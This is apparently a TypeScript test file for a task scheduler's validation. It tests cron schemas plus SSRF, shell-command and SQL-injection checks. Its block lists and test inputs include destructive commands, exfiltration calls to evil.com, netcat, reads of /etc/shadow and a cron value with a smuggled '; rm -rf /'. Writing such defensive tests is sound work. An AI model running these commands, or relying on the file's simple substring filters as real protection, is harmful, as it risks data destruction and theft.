// @ai-context: .zero-error/architecture-map.md#logic-core
// @ai-restriction: .zero-error/code-standards.md#error-handling
import { describe, it, expect } from "vitest";
import {
  createScheduledTaskSchema,
  updateScheduledTaskSchema,
} from "@repo/shared-validation";

// Replicas locais das funcoes de seguranca para testes
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
      return false;
    }
    const hostname = parsed.hostname;
    const normalizedHost = hostname.replace(/^\[|\]$/g, "");
    if (
      normalizedHost === "localhost" ||
      normalizedHost.startsWith("127.") ||
      normalizedHost.startsWith("10.") ||
      normalizedHost.startsWith("192.168.") ||
      normalizedHost.startsWith("169.254.") ||
      normalizedHost.startsWith("172.16.") ||
      normalizedHost.startsWith("172.17.") ||
      normalizedHost.startsWith("172.18.") ||
      normalizedHost.startsWith("172.19.") ||
      normalizedHost.startsWith("172.20.") ||
      normalizedHost.startsWith("172.21.") ||
      normalizedHost.startsWith("172.22.") ||
      normalizedHost.startsWith("172.23.") ||
      normalizedHost.startsWith("172.24.") ||
      normalizedHost.startsWith("172.25.") ||
      normalizedHost.startsWith("172.26.") ||
      normalizedHost.startsWith("172.27.") ||
      normalizedHost.startsWith("172.28.") ||
      normalizedHost.startsWith("172.29.") ||
      normalizedHost.startsWith("172.30.") ||
      normalizedHost.startsWith("172.31.") ||
      normalizedHost === "::1" ||
      normalizedHost === "0.0.0.0" ||
      normalizedHost === "metadata.google.internal"
    ) {
      return false;
    }
    if (
      normalizedHost.startsWith("fe80:") ||
      normalizedHost.startsWith("fc00:") ||
      normalizedHost.startsWith("fd00:")
    ) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

function isSafeShellCommand(command: string): boolean {
  const dangerous = [
    "rm -rf",
    "rm -fr",
    "mkfs",
    "dd if=",
    ":(){:|:&};:",
    "> /dev/sda",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
    "curl ",
    "wget ",
    "nc ",
    "netcat",
    "/etc/passwd",
    "/etc/shadow",
    "chmod 777",
    "chown ",
    "kill -9",
    "pkill",
  ];
  const lower = command.toLowerCase();
  return !dangerous.some((d) => lower.includes(d));
}

function isSafeSqlQuery(sql: string): boolean {
  const upper = sql.trim().toUpperCase();
  const forbidden = [
    "DROP",
    "DELETE",
    "INSERT",
    "UPDATE",
    "ALTER",
    "CREATE",
    "TRUNCATE",
    "GRANT",
    "REVOKE",
    "EXEC",
    "EXECUTE",
    "MERGE",
    "CALL",
  ];
  if (!upper.startsWith("SELECT") && !upper.startsWith("WITH")) {
    return false;
  }
  return !forbidden.some((f) => upper.includes(f));
}

// ========== createScheduledTaskSchema ==========

describe("tasks — createScheduledTaskSchema", () => {
  const validTask = {
    name: "Backup diario",
    cron_expression: "0 2 * * *",
  };

  it("valida tarefa minima", () => {
    const result = createScheduledTaskSchema.safeParse(validTask);
    expect(result.success).toBe(true);
  });

  it("rejeita sem name", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      name: "",
    });
    expect(result.success).toBe(false);
  });

  it("rejeita sem cron_expression", () => {
    const result = createScheduledTaskSchema.safeParse({
      name: "Teste",
    });
    expect(result.success).toBe(false);
  });

  it("rejeita cron_expression com caracteres invalidos", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      cron_expression: "0 2 * * *; rm -rf /",
    });
    expect(result.success).toBe(false);
  });

  it("valida cron_expression complexo", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      cron_expression: "*/5 * * * *",
    });
    expect(result.success).toBe(true);
  });

  it("valida cron_expression com lista", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      cron_expression: "0 0,12 * * *",
    });
    expect(result.success).toBe(true);
  });

  it("valida cron_expression com range", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      cron_expression: "0 9-17 * * 1-5",
    });
    expect(result.success).toBe(true);
  });

  it("aplica default task_type=script", () => {
    const result = createScheduledTaskSchema.safeParse(validTask);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.task_type).toBe("script");
    }
  });

  it("valida task_type=http_request", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "http_request",
    });
    expect(result.success).toBe(true);
  });

  it("valida task_type=database_query", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "database_query",
    });
    expect(result.success).toBe(true);
  });

  it("valida task_type=cleanup", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "cleanup",
    });
    expect(result.success).toBe(true);
  });

  it("valida task_type=shell_command", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "shell_command",
    });
    expect(result.success).toBe(true);
  });

  it("valida task_type=report", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "report",
    });
    expect(result.success).toBe(true);
  });

  it("valida task_type=custom", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "custom",
    });
    expect(result.success).toBe(true);
  });

  it("rejeita task_type invalido", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      task_type: "malicious",
    });
    expect(result.success).toBe(false);
  });

  it("aplica default is_active=true", () => {
    const result = createScheduledTaskSchema.safeParse(validTask);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.is_active).toBe(true);
    }
  });

  it("aplica default timezone=UTC", () => {
    const result = createScheduledTaskSchema.safeParse(validTask);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.timezone).toBe("UTC");
    }
  });

  it("aplica default max_execution_seconds=300", () => {
    const result = createScheduledTaskSchema.safeParse(validTask);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.max_execution_seconds).toBe(300);
    }
  });

  it("rejeita max_execution_seconds maior que 3600", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      max_execution_seconds: 3601,
    });
    expect(result.success).toBe(false);
  });

  it("valida com notify_emails", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      notify_emails: ["admin@example.com", "ops@example.com"],
    });
    expect(result.success).toBe(true);
  });

  it("rejeita notify_emails invalido", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      notify_emails: ["not-an-email"],
    });
    expect(result.success).toBe(false);
  });

  it("rejeita mais de 20 notify_emails", () => {
    const result = createScheduledTaskSchema.safeParse({
      ...validTask,
      notify_emails: Array(21).fill("a@example.com"),
    });
    expect(result.success).toBe(false);
  });
});

// ========== updateScheduledTaskSchema ==========

describe("tasks — updateScheduledTaskSchema", () => {
  it("valida update vazio (parcial)", () => {
    const result = updateScheduledTaskSchema.safeParse({});
    expect(result.success).toBe(true);
  });

  it("valida update name", () => {
    const result = updateScheduledTaskSchema.safeParse({ name: "Novo Nome" });
    expect(result.success).toBe(true);
  });

  it("valida update description", () => {
    const result = updateScheduledTaskSchema.safeParse({
      description: "Nova descrição",
    });
    expect(result.success).toBe(true);
  });

  it("valida update task_type", () => {
    const result = updateScheduledTaskSchema.safeParse({
      task_type: "http_request",
    });
    expect(result.success).toBe(true);
  });

  it("rejeita task_type invalido no update", () => {
    const result = updateScheduledTaskSchema.safeParse({
      task_type: "malicious",
    });
    expect(result.success).toBe(false);
  });

  it("valida update cron_expression", () => {
    const result = updateScheduledTaskSchema.safeParse({
      cron_expression: "0 0 * * *",
    });
    expect(result.success).toBe(true);
  });

  it("rejeita cron_expression malicioso no update", () => {
    const result = updateScheduledTaskSchema.safeParse({
      cron_expression: "0 0 * * *; DROP TABLE",
    });
    expect(result.success).toBe(false);
  });

  it("valida update is_active", () => {
    const result = updateScheduledTaskSchema.safeParse({ is_active: false });
    expect(result.success).toBe(true);
  });

  it("valida update completo", () => {
    const result = updateScheduledTaskSchema.safeParse({
      name: "Atualizado",
      description: "Desc",
      task_type: "cleanup",
      cron_expression: "0 3 * * *",
      is_active: true,
      timezone: "America/Sao_Paulo",
      max_execution_seconds: 600,
      retry_on_failure: true,
      max_retries: 5,
      retry_delay_seconds: 120,
      notify_on_failure: true,
      notify_emails: ["ops@example.com"],
    });
    expect(result.success).toBe(true);
  });
});

// ========== SSRF Protection — isSafeUrl ==========

describe("tasks — SSRF protection (isSafeUrl)", () => {
  it("aceita URL https valida", () => {
    expect(isSafeUrl("https://api.example.com/webhook")).toBe(true);
  });

  it("aceita URL http valida", () => {
    expect(isSafeUrl("http://api.example.com/webhook")).toBe(true);
  });

  it("rejeita localhost", () => {
    expect(isSafeUrl("http://localhost:8080/admin")).toBe(false);
  });

  it("rejeita 127.x.x.x", () => {
    expect(isSafeUrl("http://127.0.0.1:8080/")).toBe(false);
  });

  it("rejeita 10.x.x.x (private)", () => {
    expect(isSafeUrl("http://10.0.0.1/")).toBe(false);
  });

  it("rejeita 192.168.x.x (private)", () => {
    expect(isSafeUrl("http://192.168.1.1/")).toBe(false);
  });

  it("rejeita 169.254.x.x (link-local/metadata)", () => {
    expect(isSafeUrl("http://169.254.169.254/latest/meta-data/")).toBe(false);
  });

  it("rejeita 172.16.x.x (private)", () => {
    expect(isSafeUrl("http://172.16.0.1/")).toBe(false);
  });

  it("rejeita 172.31.x.x (private)", () => {
    expect(isSafeUrl("http://172.31.0.1/")).toBe(false);
  });

  it("rejeita ::1 (IPv6 loopback)", () => {
    expect(isSafeUrl("http://[::1]/")).toBe(false);
  });

  it("rejeita 0.0.0.0", () => {
    expect(isSafeUrl("http://0.0.0.0/")).toBe(false);
  });

  it("rejeita metadata.google.internal", () => {
    expect(isSafeUrl("http://metadata.google.internal/")).toBe(false);
  });

  it("rejeita fe80:: (IPv6 link-local)", () => {
    expect(isSafeUrl("http://[fe80::1]/")).toBe(false);
  });

  it("rejeita fc00:: (IPv6 ULA)", () => {
    expect(isSafeUrl("http://[fc00::1]/")).toBe(false);
  });

  it("rejeita protocolo nao-http", () => {
    expect(isSafeUrl("file:///etc/passwd")).toBe(false);
  });

  it("rejeita ftp", () => {
    expect(isSafeUrl("ftp://example.com/")).toBe(false);
  });

  it("rejeita URL invalida", () => {
    expect(isSafeUrl("not-a-url")).toBe(false);
  });
});

// ========== Command Injection Protection — isSafeShellCommand ==========

describe("tasks — Command Injection protection (isSafeShellCommand)", () => {
  it("aceita comando seguro", () => {
    expect(isSafeShellCommand("ls -la /tmp")).toBe(true);
  });

  it("aceita echo", () => {
    expect(isSafeShellCommand("echo hello")).toBe(true);
  });

  it("aceita ps aux", () => {
    expect(isSafeShellCommand("ps aux")).toBe(true);
  });

  it("rejeita rm -rf", () => {
    expect(isSafeShellCommand("rm -rf /")).toBe(false);
  });

  it("rejeita rm -fr", () => {
    expect(isSafeShellCommand("rm -fr /")).toBe(false);
  });

  it("rejeita mkfs", () => {
    expect(isSafeShellCommand("mkfs.ext4 /dev/sda1")).toBe(false);
  });

  it("rejeita dd if=", () => {
    expect(isSafeShellCommand("dd if=/dev/zero of=/dev/sda")).toBe(false);
  });

  it("rejeita shutdown", () => {
    expect(isSafeShellCommand("shutdown -h now")).toBe(false);
  });

  it("rejeita reboot", () => {
    expect(isSafeShellCommand("reboot")).toBe(false);
  });

  it("rejeita curl (data exfil)", () => {
    expect(isSafeShellCommand("curl http://evil.com/exfil")).toBe(false);
  });

  it("rejeita wget (data exfil)", () => {
    expect(isSafeShellCommand("wget http://evil.com/payload")).toBe(false);
  });

  it("rejeita nc (netcat)", () => {
    expect(isSafeShellCommand("nc -l 4444")).toBe(false);
  });

  it("rejeita /etc/passwd", () => {
    expect(isSafeShellCommand("cat /etc/passwd")).toBe(false);
  });

  it("rejeita /etc/shadow", () => {
    expect(isSafeShellCommand("cat /etc/shadow")).toBe(false);
  });

  it("rejeita chmod 777", () => {
    expect(isSafeShellCommand("chmod 777 /etc")).toBe(false);
  });

  it("rejeita kill -9", () => {
    expect(isSafeShellCommand("kill -9 1")).toBe(false);
  });

  it("rejeita pkill", () => {
    expect(isSafeShellCommand("pkill python")).toBe(false);
  });

  it("rejeita fork bomb", () => {
    expect(isSafeShellCommand(":(){:|:&};:")).toBe(false);
  });
});

// ========== SQL Injection Protection — isSafeSqlQuery ==========

describe("tasks — SQL Injection protection (isSafeSqlQuery)", () => {
  it("aceita SELECT simples", () => {
    expect(isSafeSqlQuery("SELECT * FROM users")).toBe(true);
  });

  it("aceita SELECT com WHERE", () => {
    expect(
      isSafeSqlQuery("SELECT id, name FROM users WHERE active = true"),
    ).toBe(true);
  });

  it("aceita WITH (CTE)", () => {
    expect(isSafeSqlQuery("WITH t AS (SELECT 1) SELECT * FROM t")).toBe(true);
  });

  it("aceita SELECT com JOIN", () => {
    expect(
      isSafeSqlQuery(
        "SELECT u.name FROM users u JOIN orders o ON u.id = o.user_id",
      ),
    ).toBe(true);
  });

  it("rejeita DROP", () => {
    expect(isSafeSqlQuery("DROP TABLE users")).toBe(false);
  });

  it("rejeita DELETE", () => {
    expect(isSafeSqlQuery("DELETE FROM users")).toBe(false);
  });

  it("rejeita INSERT", () => {
    expect(isSafeSqlQuery("INSERT INTO users VALUES (1)")).toBe(false);
  });

  it("rejeita UPDATE", () => {
    expect(isSafeSqlQuery("UPDATE users SET admin = true")).toBe(false);
  });

  it("rejeita ALTER", () => {
    expect(isSafeSqlQuery("ALTER TABLE users ADD COLUMN x text")).toBe(false);
  });

  it("rejeita CREATE", () => {
    expect(isSafeSqlQuery("CREATE TABLE evil (data text)")).toBe(false);
  });

  it("rejeita TRUNCATE", () => {
    expect(isSafeSqlQuery("TRUNCATE TABLE users")).toBe(false);
  });

  it("rejeita GRANT", () => {
    expect(isSafeSqlQuery("GRANT ALL ON users TO public")).toBe(false);
  });

  it("rejeita EXEC", () => {
    expect(isSafeSqlQuery("EXEC sp_executesql('DROP TABLE users')")).toBe(
      false,
    );
  });

  it("rejeita SELECT com DROP embutido", () => {
    expect(isSafeSqlQuery("SELECT * FROM users; DROP TABLE users")).toBe(false);
  });

  it("rejeita comando que nao comeca com SELECT ou WITH", () => {
    expect(isSafeSqlQuery("VACUUM FULL")).toBe(false);
  });
});

// ========== Logica de Limit Pagination ==========

describe("tasks — logica de limit pagination", () => {
  it("runs limit default 50", () => {
    const limit = Math.min(parseInt("50", 10), 200);
    expect(limit).toBe(50);
  });

  it("runs limit maximo 200", () => {
    const limit = Math.min(parseInt("999", 10), 200);
    expect(limit).toBe(200);
  });
});
